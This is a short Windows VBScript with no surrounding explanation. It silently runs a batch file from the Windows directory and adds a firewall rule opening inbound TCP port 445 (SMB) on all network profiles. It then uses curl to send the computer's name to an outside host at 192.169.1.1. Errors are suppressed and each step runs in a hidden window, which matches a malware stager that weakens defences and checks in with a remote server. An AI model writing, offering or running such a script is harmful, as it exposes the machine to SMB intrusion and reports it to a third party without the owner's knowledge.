On Error Resume Next
Set oShell = CreateObject ("WScript.Shell") 
windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )

With oShell
  .Run windir & "\step.bat", 0, True
  
  .Run "cmd /c NETSH advfirewall firewall add rule name=""445"" profile=public,private,domain dir=in localport=445 protocol=tcp action=allow description=""445""", 0, True
  .Run "curl http://192.169.1.1/alert.php?q=step_" & strComputerName, 0, True
  
End With

